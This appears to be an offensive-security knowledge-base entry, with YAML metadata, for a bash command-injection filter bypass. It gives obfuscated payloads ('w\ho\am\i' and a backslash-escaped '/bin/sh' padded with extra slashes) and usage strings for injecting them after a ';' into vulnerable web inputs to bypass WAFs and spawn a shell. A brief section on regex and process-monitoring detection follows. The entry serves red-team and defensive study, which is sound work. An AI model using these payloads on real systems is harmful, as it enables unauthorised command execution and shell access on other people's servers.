---
id: 93b44127-56be-4130-bb0b-195312f177fe
name: Bash-Command-Injection-Bypass-Backslash-Slash
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:57.307392+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - bypass
  - obfuscation
  - payload
validated: true
---

# Bash-Command-Injection-Bypass-Backslash-Slash

## Code

```bash
w\ho\am\i
/\b\i\n/////s\h
```

## Description

This code snippet provides obfuscated versions of common Unix commands ('whoami' and '/bin/sh') using backslashes to escape and split terms, combined with redundant slashes to evade filter detection. It is designed for injection into vulnerable web inputs where direct commands are blacklisted, allowing execution of reconnaissance or shell spawning on Unix systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static snippet; customize by adding injection separators like ';' before use. | N/A |

## Usage

Inject this snippet into a command injection point, e.g., via a web form: 'input=normal; w\ho\am\i'. For shell access: 'input=normal; /\b\i\n/////s\h'. Deliver using tools like curl or Burp Suite. Used in red team engagements to bypass WAFs or input sanitization during initial RCE.

## Detection

- Monitor inputs for unusual escape sequences (multiple \ or /) using regex patterns in logs or WAF rules.
- Log shell executions and alert on commands matching deobfuscated patterns like 'whoami' or '/bin/sh'.
- Network anomalies: Unexpected shell outputs in HTTP responses or process spawns from web servers.

## Related

- [[procedures/Command-Injection-Filter-Bypass-with-Backslash-and-Slash]]
- [[tools/Burp-Suite]]
